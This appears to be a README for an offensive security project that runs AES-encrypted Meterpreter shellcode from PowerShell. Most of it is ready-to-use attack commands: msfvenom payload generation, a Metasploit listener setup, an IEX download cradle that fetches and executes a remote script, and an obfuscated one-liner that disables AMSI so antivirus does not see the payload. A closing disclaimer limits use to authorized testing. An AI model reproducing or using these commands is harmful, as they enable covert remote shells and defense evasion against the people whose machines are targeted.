# PowerShell Shellcode Runner with AES-256 Encryption

## Overview
This project demonstrates how to encrypt a shellcode (revshell) payload using **AES-256 CBC encryption** for execution within a **PowerShell script**. The encryption process enhances evasion techniques to **_<u>bypass AV</u>_** by encoding the payload before execution.

## Steps

### 1. Generate the Shellcode
Use `msfvenom` to generate a reverse shell payload in raw format:

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f raw > shellcode.bin
```

---

### 2. Encrypt the Payload
- Use the provided **Python encryption script** (`AES_encrypt.py`) to **AES-256 encrypt** the shellcode with a static key.
- The script applies **PKCS7 padding** and encodes the payload in **Base64**.

Run the script:

```sh
python3 AES_encrypt.py
```

After execution, the **Base64-encoded encrypted shellcode** will be printed and saved to `encrypted_shellcode.txt`.

---

### 3. Embed the Encrypted Payload in PowerShell
- Open `run.ps1`
- Replace `<PASTE THE BASE64 ENCRYPTED PAYLOAD HERE>` with the generated encrypted shellcode from **Step 2**.
- The PowerShell script includes:
  - **AMSI bypass** to avoid detection
  - **AES-256 decryption** of the payload
  - **Memory execution of shellcode** without writing to disk

---

### 4. Setup Metasploit Listener
Start Metasploit and configure the **multi-handler**:

```sh
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST=<YOUR_IP>; set LPORT=<PORT>; exploit"
```

---

### 5. Execute the PowerShell Script
To **execute the payload locally**, run:

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -File runner.ps1
```

To **execute remotely**, use:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://YOUR_SERVER_IP/runner.ps1")
```

If **blocked by AV**, use an **AMSI bypass**:

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -Command "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER_IP/run.ps1')"
```

---

## Disclaimer
This project is intended for **educational and authorized penetration testing purposes only**. Unauthorized use is **strictly prohibited**.
